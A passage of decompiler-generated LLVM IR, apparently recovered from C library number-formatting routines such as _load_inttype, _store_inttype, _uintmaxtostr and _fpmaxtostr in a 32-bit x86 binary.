  %v1_8055de1 = or i32 %v2_8055ddd, 64
  store i32 %v1_8055de1, i32* %eax.global-to-local, align 4
  %v1_8055de4 = trunc i32 %v1_8055de1 to i16
  %v3_8055de4 = inttoptr i32 %v2_8055de4 to i16*
  store i16 %v1_8055de4, i16* %v3_8055de4, align 2
  %v0_8055de7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055de7 = urem i32 %v0_8055de7, 65536
  store i32 %v1_8055de7, i32* %eax.global-to-local, align 4
  %v3_8055dea = and i32 %v0_8055de7, 2816
  %v4_8055dea = icmp eq i32 %v3_8055dea, 0
  %v1_8055ded = icmp eq i1 %v4_8055dea, false
  br i1 %v1_8055ded, label %dec_label_pc_8055df5, label %dec_label_pc_8055def

dec_label_pc_8055def:                             ; preds = %dec_label_pc_8055ddd
  %v0_8055def = load i32, i32* @ebx, align 4
  %v1_8055def = add i32 %v0_8055def, 12
  %v2_8055def = inttoptr i32 %v1_8055def to i32*
  %v3_8055def = load i32, i32* %v2_8055def, align 4
  store i32 %v3_8055def, i32* %eax.global-to-local, align 4
  %v2_8055df2 = add i32 %v0_8055def, 28
  %v3_8055df2 = inttoptr i32 %v2_8055df2 to i32*
  store i32 %v3_8055def, i32* %v3_8055df2, align 4
  br label %dec_label_pc_8055df5

dec_label_pc_8055df5:                             ; preds = %dec_label_pc_8055ddd, %dec_label_pc_8055d86, %dec_label_pc_8055def
  %v0_8055df5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055df5, i32* %eax.global-to-local, align 4
  %v2_8055df7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055df7, i32* %edx.global-to-local, align 4
  store i32 %v0_8055d54, i32* @ebx, align 4
  ret i32 %v0_8055df5

; uselistorder directives
  uselistorder i32 %v0_8055de7, { 1, 0 }
  uselistorder i32 %v1_8055daa, { 1, 0, 2 }
  uselistorder i32 %v0_8055dbc, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8055d60, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055d54, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055df5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055ddd, { 1, 0 }
  uselistorder label %dec_label_pc_8055d73, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8055dfc = icmp slt i32 %tmp5, 0
  %v3_8055e2d = and i32 %tmp4, 2048
  %v4_8055e2d = icmp eq i32 %v3_8055e2d, 0
  br i1 %v5_8055dfc, label %dec_label_pc_8055e2d, label %dec_label_pc_8055e0b

dec_label_pc_8055e0b:                             ; preds = %entry
  %v1_8055e0e = icmp eq i1 %v4_8055e2d, false
  br i1 %v1_8055e0e, label %dec_label_pc_8055e32, label %dec_label_pc_8055e10

dec_label_pc_8055e10:                             ; preds = %dec_label_pc_8055e0b
  %v6_8055e10 = icmp eq i32 %tmp4, 256
  %v1_8055e16 = inttoptr i32 %tmp to i32*
  %v2_8055e16 = load i32, i32* %v1_8055e16, align 4
  %v1_8055e18 = icmp eq i1 %v6_8055e10, false
  br i1 %v1_8055e18, label %dec_label_pc_8055e1f, label %dec_label_pc_8055e1a

dec_label_pc_8055e1a:                             ; preds = %dec_label_pc_8055e10
  %v1_8055e1a = urem i32 %v2_8055e16, 256
  br label %dec_label_pc_8055e2a

dec_label_pc_8055e1f:                             ; preds = %dec_label_pc_8055e10
  %v6_8055e1f = icmp eq i32 %tmp4, 512
  %v1_8055e25 = icmp eq i1 %v6_8055e1f, false
  br i1 %v1_8055e25, label %dec_label_pc_8055e2a, label %dec_label_pc_8055e27

dec_label_pc_8055e27:                             ; preds = %dec_label_pc_8055e1f
  %v1_8055e27 = urem i32 %v2_8055e16, 65536
  br label %dec_label_pc_8055e2a

dec_label_pc_8055e2a:                             ; preds = %dec_label_pc_8055e1f, %dec_label_pc_8055e1a, %dec_label_pc_8055e27
  %v0_8055e2c = phi i32 [ %v2_8055e16, %dec_label_pc_8055e1f ], [ %v1_8055e1a, %dec_label_pc_8055e1a ], [ %v1_8055e27, %dec_label_pc_8055e27 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055e2c

dec_label_pc_8055e2d:                             ; preds = %entry
  br i1 %v4_8055e2d, label %dec_label_pc_8055e38, label %dec_label_pc_8055e32

dec_label_pc_8055e32:                             ; preds = %dec_label_pc_8055e2d, %dec_label_pc_8055e0b
  %v1_8055e32 = add i32 %tmp, 4
  %v2_8055e32 = inttoptr i32 %v1_8055e32 to i32*
  %v3_8055e32 = load i32, i32* %v2_8055e32, align 4
  store i32 %v3_8055e32, i32* @edx, align 4
  %v1_8055e35 = inttoptr i32 %tmp to i32*
  %v2_8055e35 = load i32, i32* %v1_8055e35, align 4
  ret i32 %v2_8055e35

dec_label_pc_8055e38:                             ; preds = %dec_label_pc_8055e2d
  %v6_8055e38 = icmp eq i32 %tmp4, 256
  %v1_8055e3e = inttoptr i32 %tmp to i32*
  %v2_8055e3e = load i32, i32* %v1_8055e3e, align 4
  %v1_8055e40 = icmp eq i1 %v6_8055e38, false
  br i1 %v1_8055e40, label %dec_label_pc_8055e47, label %dec_label_pc_8055e42

dec_label_pc_8055e42:                             ; preds = %dec_label_pc_8055e38
  %v1_8055e42 = mul i32 %v2_8055e3e, 16777216
  %v2_8055e42 = sdiv i32 %v1_8055e42, 16777216
  br label %dec_label_pc_8055e50

dec_label_pc_8055e47:                             ; preds = %dec_label_pc_8055e38
  %v6_8055e47 = icmp eq i32 %tmp4, 512
  %v1_8055e4d = icmp eq i1 %v6_8055e47, false
  br i1 %v1_8055e4d, label %dec_label_pc_8055e50, label %dec_label_pc_8055e4f

dec_label_pc_8055e4f:                             ; preds = %dec_label_pc_8055e47
  %v1_8055e4f = mul i32 %v2_8055e3e, 65536
  %v2_8055e4f = sdiv i32 %v1_8055e4f, 65536
  br label %dec_label_pc_8055e50

dec_label_pc_8055e50:                             ; preds = %dec_label_pc_8055e47, %dec_label_pc_8055e42, %dec_label_pc_8055e4f
  %v0_8055e50 = phi i32 [ %v2_8055e3e, %dec_label_pc_8055e47 ], [ %v2_8055e42, %dec_label_pc_8055e42 ], [ %v2_8055e4f, %dec_label_pc_8055e4f ]
  %v1_8055e50 = ashr i32 %v0_8055e50, 31
  store i32 %v1_8055e50, i32* @edx, align 4
  ret i32 %v0_8055e50

; uselistorder directives
  uselistorder i32 %v0_8055e50, { 1, 0 }
  uselistorder i32 %v2_8055e3e, { 2, 0, 1 }
  uselistorder i32 %v2_8055e16, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055e50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055e2a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055e54 = load i32, i32* @ebx, align 4
  store i32 %v0_8055e54, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055e59 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055e59, i32* %ebx.global-to-local, align 4
  %v4_8055e5d = trunc i32 %tmp4 to i16
  %v6_8055e65 = icmp eq i32 %tmp6, 256
  %v1_8055e6b = icmp eq i1 %v6_8055e65, false
  br i1 %v1_8055e6b, label %dec_label_pc_8055e71, label %dec_label_pc_8055e6d

dec_label_pc_8055e6d:                             ; preds = %entry
  %v2_8055e6d = trunc i32 %tmp4 to i8
  %v4_8055e6d = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055e6d, i8* %v4_8055e6d, align 1
  br label %dec_label_pc_8055e8f

dec_label_pc_8055e71:                             ; preds = %entry
  %v6_8055e71 = icmp eq i32 %tmp6, 2048
  %v1_8055e77 = icmp eq i1 %v6_8055e71, false
  br i1 %v1_8055e77, label %dec_label_pc_8055e80, label %dec_label_pc_8055e79

dec_label_pc_8055e79:                             ; preds = %dec_label_pc_8055e71
  %sext2 = mul i32 %tmp4, 65536
  %v1_8055e79 = sdiv i32 %sext2, 65536
  %v3_8055e79 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055e79, i32* %v3_8055e79, align 4
  %v0_8055e7b = load i32, i32* %edx.global-to-local, align 4
  %v1_8055e7b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055e7b = add i32 %v1_8055e7b, 4
  %v3_8055e7b = inttoptr i32 %v2_8055e7b to i32*
  store i32 %v0_8055e7b, i32* %v3_8055e7b, align 4
  br label %dec_label_pc_8055e8f

dec_label_pc_8055e80:                             ; preds = %dec_label_pc_8055e71
  %v6_8055e80 = icmp eq i32 %tmp6, 512
  %v1_8055e86 = icmp eq i1 %v6_8055e80, false
  br i1 %v1_8055e86, label %dec_label_pc_8055e8d, label %dec_label_pc_8055e88

dec_label_pc_8055e88:                             ; preds = %dec_label_pc_8055e80
  store i16 %v4_8055e5d, i16* %tmp5, align 2
  br label %dec_label_pc_8055e8f

dec_label_pc_8055e8d:                             ; preds = %dec_label_pc_8055e80
  %sext3 = mul i32 %tmp4, 65536
  %v1_8055e8d = sdiv i32 %sext3, 65536
  %v3_8055e8d = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055e8d, i32* %v3_8055e8d, align 4
  br label %dec_label_pc_8055e8f

dec_label_pc_8055e8f:                             ; preds = %dec_label_pc_8055e88, %dec_label_pc_8055e79, %dec_label_pc_8055e6d, %dec_label_pc_8055e8d
  %v2_8055e8f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055e8f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8055e90 = sdiv i32 %sext, 65536
  ret i32 %v1_8055e90

; uselistorder directives
  uselistorder label %dec_label_pc_8055e8f, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8055e9f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055e9f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8055eab = icmp slt i32 %arg4, 0
  %v1_8055ead = icmp eq i1 %v2_8055eab, false
  br i1 %v1_8055ead, label %dec_label_pc_8055ece, label %dec_label_pc_8055eaf

dec_label_pc_8055eaf:                             ; preds = %entry
  %v1_8055eaf = sub i32 0, %arg4
  store i32 %v1_8055eaf, i32* %esi.global-to-local, align 4
  %v2_8055eb1 = icmp slt i32 %arg3, 0
  %v1_8055eb3 = icmp eq i1 %v2_8055eb1, false
  br i1 %v1_8055eb3, label %dec_label_pc_8055ece, label %dec_label_pc_8055eb5

dec_label_pc_8055eb5:                             ; preds = %dec_label_pc_8055eaf
  %v1_8055eb5 = sub i32 0, %arg2
  %v5_8055eb5 = icmp ne i32 %arg2, 0
  store i32 %v1_8055eb5, i32* %ecx.global-to-local, align 4
  %v2_8055eb7 = zext i1 %v5_8055eb5 to i32
  %v3_8055eb7 = add i32 %v2_8055eb7, %arg3
  %v1_8055eba = sub i32 0, %v3_8055eb7
  store i32 %v1_8055eba, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055ece

dec_label_pc_8055ece:                             ; preds = %entry, %dec_label_pc_8055eaf, %dec_label_pc_8055eb5
  %v0_8055ed3 = phi i32 [ %v1_8055eaf, %dec_label_pc_8055eb5 ], [ %v1_8055eaf, %dec_label_pc_8055eaf ], [ %arg4, %entry ]
  %storemerge12 = phi i32 [ 1, %dec_label_pc_8055eb5 ], [ 0, %dec_label_pc_8055eaf ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8055ed3
  %tmp31 = urem i32 -1, %v0_8055ed3
  store i8 0, i8* %arg1, align 1
  %v1_8055ed8 = add i32 %tmp31, 1
  %v1_8055ed9 = load i32, i32* %esi.global-to-local, align 4
  %v12_8055ed9 = icmp eq i32 %v1_8055ed8, %v1_8055ed9
  %v1_8055ee3 = icmp eq i1 %v12_8055ed9, false
  br i1 %v1_8055ee3, label %dec_label_pc_8055ef2, label %dec_label_pc_8055ee5

dec_label_pc_8055ee5:                             ; preds = %dec_label_pc_8055ece
  %v1_8055ee5 = add i32 %div, 1
  br label %dec_label_pc_8055ef2

dec_label_pc_8055ef2:                             ; preds = %dec_label_pc_8055ece, %dec_label_pc_8055ee5
  %stack_var_-20.0.off0 = phi i32 [ %v1_8055ed8, %dec_label_pc_8055ece ], [ 0, %dec_label_pc_8055ee5 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8055ece ], [ %v1_8055ee5, %dec_label_pc_8055ee5 ]
  %v0_8055ef2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055ef2, i32* %ebp.global-to-local, align 4
  %v0_8055ef4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055ef4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055ef8

dec_label_pc_8055ef8:                             ; preds = %dec_label_pc_8055f46, %dec_label_pc_8055ef2
  %v0_8055f2f = phi i32 [ %v0_8055f48, %dec_label_pc_8055f46 ], [ %v0_8055ef2, %dec_label_pc_8055ef2 ]
  %v0_8055efc = phi i32 [ %v1_8055f4a, %dec_label_pc_8055f46 ], [ %v0_8055ef4, %dec_label_pc_8055ef2 ]
  %v1_8055ef8 = icmp eq i32 %v0_8055efc, 0
  br i1 %v1_8055ef8, label %dec_label_pc_8055f2f, label %dec_label_pc_8055efc

dec_label_pc_8055efc:                             ; preds = %dec_label_pc_8055ef8
  %v0_8055f00 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8055efc, %v0_8055f00
  %tmp32 = urem i32 %v0_8055efc, %v0_8055f00
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8055f2f, %v0_8055f00
  %tmp33 = urem i32 %v0_8055f2f, %v0_8055f00
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8055f13 = mul i32 %tmp32, %stack_var_-20.0.off0
  %v2_8055f17 = add i32 %tmp33, %v6_8055f13
  %v8_8055f1d = mul i32 %tmp32, %stack_var_-24.0.in
  %v2_8055f22 = add i32 %div8, %v8_8055f1d
  store i32 %v2_8055f22, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8055f17, %v0_8055f00
  %tmp34 = urem i32 %v2_8055f17, %v0_8055f00
  %v2_8055f2a = add i32 %div9, %v2_8055f22
  br label %dec_label_pc_8055f37

dec_label_pc_8055f2f:                             ; preds = %dec_label_pc_8055ef8
  %v0_8055f33 = load i32, i32* %esi.global-to-local, align 4
  %div11 = udiv i32 %v0_8055f2f, %v0_8055f33
  %tmp35 = urem i32 %v0_8055f2f, %v0_8055f33
  br label %dec_label_pc_8055f37

dec_label_pc_8055f37:                             ; preds = %dec_label_pc_8055efc, %dec_label_pc_8055f2f
  %v13_8055f3d = phi i32 [ %tmp34, %dec_label_pc_8055efc ], [ %tmp35, %dec_label_pc_8055f2f ]
  %storemerge = phi i32 [ %v2_8055f2a, %dec_label_pc_8055efc ], [ %div11, %dec_label_pc_8055f2f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055f37 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055f37 = add i32 %v0_8055f37, -1
  store i32 %v1_8055f37, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8055f3d, 10
  br i1 %tmp, label %dec_label_pc_8055f3d, label %dec_label_pc_8055f42

dec_label_pc_8055f3d:                             ; preds = %dec_label_pc_8055f37
  %v2_8055f3d = add i32 %v13_8055f3d, 48
  %v12_8055f3d = and i32 %v2_8055f3d, 255
  %v14_8055f3d = and i32 %v13_8055f3d, -256
  %v15_8055f3d = or i32 %v12_8055f3d, %v14_8055f3d
  br label %dec_label_pc_8055f46

dec_label_pc_8055f42:                             ; preds = %dec_label_pc_8055f37
  %v6_8055f42 = add i32 %v13_8055f3d, %arg5
  %v21_8055f42 = and i32 %v6_8055f42, 255
  %v23_8055f42 = and i32 %v13_8055f3d, -256
  %v24_8055f42 = or i32 %v21_8055f42, %v23_8055f42
  br label %dec_label_pc_8055f46

dec_label_pc_8055f46:                             ; preds = %dec_label_pc_8055f3d, %dec_label_pc_8055f42
  %storemerge10 = phi i32 [ %v15_8055f3d, %dec_label_pc_8055f3d ], [ %v24_8055f42, %dec_label_pc_8055f42 ]
  %v1_8055f46 = trunc i32 %storemerge10 to i8
  %v3_8055f46 = inttoptr i32 %v1_8055f37 to i8*
  store i8 %v1_8055f46, i8* %v3_8055f46, align 1
  %v0_8055f48 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055f4a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055f4a = or i32 %v1_8055f4a, %v0_8055f48
  %v3_8055f4a = icmp eq i32 %v2_8055f4a, 0
  %v1_8055f4c = icmp eq i1 %v3_8055f4a, false
  br i1 %v1_8055f4c, label %dec_label_pc_8055ef8, label %dec_label_pc_8055f4e

dec_label_pc_8055f4e:                             ; preds = %dec_label_pc_8055f46
  %v4_8055f4e = icmp eq i32 %storemerge12, 0
  br i1 %v4_8055f4e, label %dec_label_pc_8055f59, label %dec_label_pc_8055f55

dec_label_pc_8055f55:                             ; preds = %dec_label_pc_8055f4e
  %v0_8055f55 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055f55 = add i32 %v0_8055f55, -1
  store i32 %v1_8055f55, i32* %edi.global-to-local, align 4
  %v1_8055f56 = inttoptr i32 %v1_8055f55 to i8*
  store i8 45, i8* %v1_8055f56, align 1
  br label %dec_label_pc_8055f59

dec_label_pc_8055f59:                             ; preds = %dec_label_pc_8055f4e, %dec_label_pc_8055f55
  %v0_8055f5c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055f5c

; uselistorder directives
  uselistorder i32 %v13_8055f3d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8055f17, { 1, 0 }
  uselistorder i32 %v0_8055f00, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8055efc, { 1, 0, 2 }
  uselistorder i32 %v0_8055f2f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8055ed8, { 1, 0 }
  uselistorder i32 %v0_8055ed3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055f59, { 1, 0 }
  uselistorder label %dec_label_pc_8055f46, { 1, 0 }
  uselistorder label %dec_label_pc_8055f37, { 1, 0 }
  uselistorder label %dec_label_pc_8055ef2, { 1, 0 }
  uselistorder label %dec_label_pc_8055ece, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_4()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055f65 = load i32, i32* @edi, align 4
  %v0_8055f66 = load i32, i32* @esi, align 4
  %v0_8055f67 = load i32, i32* @ebx, align 4
  store i32 %v0_8055f67, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8055f7c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8055f7c = add i3 %v4_8055f7c, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8055f7c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055f83 = add i32 %tmp156, 4
  %v2_8055f83 = inttoptr i32 %v1_8055f83 to i32*
  %v3_8055f83 = load i32, i32* %v2_8055f83, align 4
  store i32 %v3_8055f83, i32* %eax.global-to-local, align 4
  %v1_8055f8a = add i32 %tmp156, 8
  %v2_8055f8a = inttoptr i32 %v1_8055f8a to i8*
  %v3_8055f8a = load i8, i8* %v2_8055f8a, align 1
  %v4_8055f8a = zext i8 %v3_8055f8a to i32
  %v6_8055f8a = and i32 %v0_8055f67, -256
  %v7_8055f8a = or i32 %v4_8055f8a, %v6_8055f8a
  store i32 %v7_8055f8a, i32* %ebx.global-to-local, align 4
  %v1_8055f8d = inttoptr i32 %tmp156 to i32*
  %v2_8055f8d = load i32, i32* %v1_8055f8d, align 4
  store i32 %v2_8055f8d, i32* %ebp.global-to-local, align 4
  %v2_8055f99 = or i8 %v3_8055f8a, 32
  %v7_8055f99 = zext i8 %v2_8055f99 to i32
  %v9_8055f99 = and i32 %v3_8055f83, -256
  %v10_8055f99 = or i32 %v7_8055f99, %v9_8055f99
  store i32 %v10_8055f99, i32* %eax.global-to-local, align 4
  %v10_8055f9b = icmp eq i8 %v2_8055f99, 97
  %v1_8055fa1 = icmp eq i1 %v10_8055f9b, false
  br i1 %v1_8055fa1, label %dec_label_pc_8055faa, label %dec_label_pc_8055fa3

dec_label_pc_8055fa3:                             ; preds = %entry
  %v2_8055fa3 = add i8 %v3_8055f8a, 6
  %v15_8055fa3 = zext i8 %v2_8055fa3 to i32
  %v18_8055fa3 = or i32 %v15_8055fa3, %v6_8055f8a
  store i32 %v18_8055fa3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055faa

dec_label_pc_8055faa:                             ; preds = %entry, %dec_label_pc_8055fa3
  %stack_var_-207.0 = phi i8 [ %v3_8055f8a, %entry ], [ %v2_8055fa3, %dec_label_pc_8055fa3 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8055fb1 = icmp slt i32 %v2_8055f8d, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8055fc0 = select i1 %v2_8055fb1, i32 6, i32 %v2_8055f8d
  store i32 %v3_8055fc0, i32* %ebp.global-to-local, align 4
  %v1_8055fc3 = add i32 %tmp156, 12
  %v2_8055fc3 = inttoptr i32 %v1_8055fc3 to i32*
  %v3_8055fc3 = load i32, i32* %v2_8055fc3, align 4
  store i32 %v3_8055fc3, i32* %eax.global-to-local, align 4
  %v2_8055fc6 = and i32 %v3_8055fc3, 2
  %v3_8055fc6 = icmp eq i32 %v2_8055fc6, 0
  br i1 %v3_8055fc6, label %dec_label_pc_8055fd4, label %dec_label_pc_8055fe0

dec_label_pc_8055fd4:                             ; preds = %dec_label_pc_8055faa
  %v2_8055fd4 = urem i32 %v3_8055fc3, 2
  %tmp192 = trunc i32 %v2_8055fd4 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8055fe0

dec_label_pc_8055fe0:                             ; preds = %dec_label_pc_8055fd4, %dec_label_pc_8055faa
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8055faa ], [ %tmp193, %dec_label_pc_8055fd4 ]
  %not.v5_8055fe0 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8055fe0, label %dec_label_pc_8056057, label %dec_label_pc_8056002

dec_label_pc_8056002:                             ; preds = %dec_label_pc_8055fe0
  %v1_8056002 = add i3 %v4_8055f7c, -2
  store i3 %v1_8056002, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8056006 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8056006, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8056002
  br label %dec_label_pc_8056092

bb180:                                            ; preds = %dec_label_pc_8056002
  %v5_8056006 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8056006, label %bb181, label %dec_label_pc_805600a

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8056092

dec_label_pc_805600a:                             ; preds = %bb180
  %not.v4_8056004 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8056004, label %dec_label_pc_8056092, label %dec_label_pc_8056127

dec_label_pc_8056057:                             ; preds = %dec_label_pc_8055fe0
  store i3 %v4_8055f7c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_805605e = add i32 %tmp156, 16
  %v2_805605e = inttoptr i32 %v1_805605e to i32*
  store i32 32, i32* %v2_805605e, align 4
  %v4_8056065 = add i8 %stack_var_-207.0, -96
  %v6_8056065 = sub i8 95, %stack_var_-207.0
  %v7_8056065 = and i8 %v6_8056065, %stack_var_-207.0
  %v8_8056065 = icmp slt i8 %v7_8056065, 0
  %v9_8056065 = icmp eq i8 %v4_8056065, 0
  %v10_8056065 = icmp slt i8 %v4_8056065, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_805607a = icmp eq i1 %v10_8056065, %v8_8056065
  %v4_805607a = icmp eq i1 %v9_8056065, false
  %v5_805607a = and i1 %v4_805607a, %v3_805607a
  br i1 %v5_805607a, label %dec_label_pc_8056081, label %dec_label_pc_805607c

dec_label_pc_805607c:                             ; preds = %dec_label_pc_8056057
  br label %dec_label_pc_8056081

dec_label_pc_8056081:                             ; preds = %dec_label_pc_8056057, %dec_label_pc_805607c
  %v2_8056089 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8056089, i32* @ecx, align 4
  br label %dec_label_pc_8056452

dec_label_pc_8056092:                             ; preds = %dec_label_pc_805600a, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80560ac = xor i3 %v4_8055f7c, -4
  store i3 %v3_80560ac, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80560b2

dec_label_pc_80560b2:                             ; preds = %dec_label_pc_8056103, %dec_label_pc_8056092
  %v0_8056103 = phi i32 [ 4096, %dec_label_pc_8056092 ], [ %v2_8056103, %dec_label_pc_8056103 ]
  %v2_80560b5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8056092 ], [ %v2_80560b581, %dec_label_pc_8056103 ]
  %v1_80560ed = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8056092 ], [ %v0_80560b279, %dec_label_pc_8056103 ]
  %v0_80560ff66 = phi i32 [ 13, %dec_label_pc_8056092 ], [ %v1_80560b4, %dec_label_pc_8056103 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8056092 ], [ %stack_var_-220.1, %dec_label_pc_8056103 ]
  %v1_80560b4 = add i32 %v0_80560ff66, -1
  %v4_80560b5 = fcmp ule x86_fp80 %v1_80560ed, %v2_80560b5
  br i1 %v4_80560b5, label %dec_label_pc_80560dc, label %dec_label_pc_80560b9

dec_label_pc_80560b9:                             ; preds = %dec_label_pc_80560b2
  store x86_fp80 %v1_80560ed, x86_fp80* %st0.global-to-local, align 4
  %v3_80560bb = mul i32 %v1_80560b4, 12
  store i32 %v3_80560bb, i32* %eax.global-to-local, align 4
  %v1_80560be = add i32 %v3_80560bb, ptrtoint (x86_fp80** @global_var_805edc0.1011 to i32)
  %v2_80560be = inttoptr i32 %v1_80560be to x86_fp80*
  %v3_80560be = load x86_fp80, x86_fp80* %v2_80560be, align 4
  %v4_80560c4 = fmul x86_fp80 %v1_80560ed, %v3_80560be
  store x86_fp80 %v4_80560c4, x86_fp80* %st1.global-to-local, align 4
  %v4_80560c8 = fcmp ule x86_fp80 %v4_80560c4, %v3_80560be
